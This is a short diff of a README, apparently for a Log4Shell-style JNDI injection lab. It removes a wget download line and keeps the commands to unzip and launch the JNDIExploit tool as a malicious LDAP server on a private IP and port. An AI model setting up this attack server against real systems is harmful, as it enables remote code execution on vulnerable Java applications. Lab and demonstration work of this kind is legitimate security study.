@@ -32,8 +32,6 @@ JNDIExploit.v1.2.zip is included in the repository as it was apparently removed 
 
 - Use <a href="https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip">JNDIExploit</a> to spin up a malicious LDAP server
 
-`wget https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip`
-
 `unzip JNDIExploit.v1.2.zip`
 
 `java -jar JNDIExploit-1.2-SNAPSHOT.jar -i your-private-ip -p 8888`
